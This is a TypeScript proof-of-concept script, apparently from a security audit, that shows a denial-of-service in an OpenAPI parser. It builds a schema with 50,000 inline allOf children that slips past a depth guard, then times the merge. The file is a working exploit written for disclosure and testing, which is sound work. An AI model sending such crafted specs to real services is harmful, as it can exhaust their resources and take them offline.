/**
 * PoC: M4 — allOf breadth DoS (depth guard bypass)
 * Run from repo root: npx ts-node --project tsconfig.json --transpile-only
 *   archon/findings/M4-allof-breadth-dos-no-limit/evidence/poc_root.ts
 *
 * The depth guard MAX_DEREF_DEPTH=999 checks only baseRefsStack.length.
 * Inline schemas push nothing onto the ref stack, so a single allOf with
 * N inline children bypasses the guard entirely, forcing N × mergeAllOf
 * calls. uniqByPropIncludeMissing also lets every inline child through
 * because k=item['$ref']=undefined => "if (!k) return true".
 */

import { OpenAPIParser } from './src/services/OpenAPIParser';
import { AcmeNormalizedOptions } from './src/services/AcmeNormalizedOptions';

const opts = new AcmeNormalizedOptions({});

function buildSpec(breadth: number): any {
  return {
    openapi: '3.0.0',
    info: { title: 'PoC', version: '0.0.1' },
    paths: {},
    components: {
      schemas: {
        BombSchema: {
          allOf: Array.from({ length: breadth }, (_, i) => ({
            type: 'string',
            maxLength: i + 1,
          })),
        },
      },
    },
  };
}

function measureMergeAllOf(breadth: number): number {
  const spec = buildSpec(breadth);
  const parser = new OpenAPIParser(spec, undefined, opts);
  const schema = spec.components.schemas.BombSchema;
  const t0 = Date.now();
  parser.mergeAllOf(schema, '#/components/schemas/BombSchema', []);
  return Date.now() - t0;
}

const BASELINE_BREADTH = 1;
const ATTACK_BREADTH   = 50_000;

// JIT warm-up
measureMergeAllOf(BASELINE_BREADTH);

console.log(`[*] Measuring baseline  (breadth = ${String(BASELINE_BREADTH).padStart(6)})`);
const baselineMs = measureMergeAllOf(BASELINE_BREADTH);
console.log(`    => ${baselineMs} ms`);

console.log(`[*] Measuring malicious (breadth = ${String(ATTACK_BREADTH).padStart(6)})`);
const attackMs = measureMergeAllOf(ATTACK_BREADTH);
console.log(`    => ${attackMs} ms`);

const ratio = baselineMs > 0
  ? (attackMs / baselineMs).toFixed(1) + 'x'
  : `${attackMs}ms vs <1ms (baseline rounded to 0)`;
console.log(`[*] Ratio: ${ratio}`);

// Verify depth guard was NOT triggered (no x-circular-ref)
const specCheck  = buildSpec(ATTACK_BREADTH);
const parserCheck = new OpenAPIParser(specCheck, undefined, opts);
const merged = parserCheck.mergeAllOf(
  specCheck.components.schemas.BombSchema,
  '#/components/schemas/BombSchema',
  [],
);
const depthGuardFired = !!merged['x-circular-ref'];
console.log(`[*] depth guard fired: ${depthGuardFired} (expected false — guard bypassed)`);
console.log(`[*] allOf children processed: ${ATTACK_BREADTH} (no breadth cap)`);

// Confirm: attack took meaningful wall-clock time and guard did not fire
const confirmed = attackMs >= 100 && !depthGuardFired;
const status    = confirmed ? 'confirmed' : 'inconclusive';
const evidence  = confirmed
  ? `mergeAllOf breadth=${ATTACK_BREADTH} took ${attackMs}ms (baseline=${baselineMs}ms); depth guard bypassed (x-circular-ref=false)`
  : `attack=${attackMs}ms baseline=${baselineMs}ms depth_guard_fired=${depthGuardFired}`;

// MUST be last stdout line — poc-runner parses this
console.log(JSON.stringify({ status, evidence, notes: `ratio=${ratio}` }));
